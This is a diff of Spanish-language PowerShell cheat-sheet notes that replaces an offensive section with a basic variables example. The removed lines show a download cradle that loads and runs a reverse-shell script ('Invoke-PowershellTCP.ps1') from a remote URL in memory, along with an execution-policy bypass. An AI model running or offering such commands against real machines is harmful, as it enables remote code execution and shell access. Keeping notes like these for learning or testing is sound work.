@@ -2,27 +2,18 @@
 
 Tags: #Windows #Powershell #Comandos 
 
-Extensiones:
-	* .ps1
-	* .psm1
-	* .psd1
+```bash 
+Extensiones en Powershell:
+- .ps1
+- .psm1
+- .psd1
+```
+
+## Variables 
 
 ```powershell 
-# Cargar un binario en PS desde memoria 
-
-❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Invoke-PowershellTCP.ps1')"
-
-Nota: Se coloca 'powershell -c' si no se ejecuta en un entorno de Powershell 
-```
-
-```powershell
-❯ Import-Module .\Script.ps1       # Importar un modulo para utilizar los submodulos 
-```
-
-```powershell
-❯ powershell -ep bypass                # Politica que nos permite bypass y poder ejecutar scripts en PS
- 	# ep = Ejecutar politicas 
-❯ ..\script.ps1                        # Ejecutar el binario en PS
+$var = "Hola"         # Definir una variable 
+Write-Host $var       # Imprimir la variable 
 ```
 
 ## Enumeración
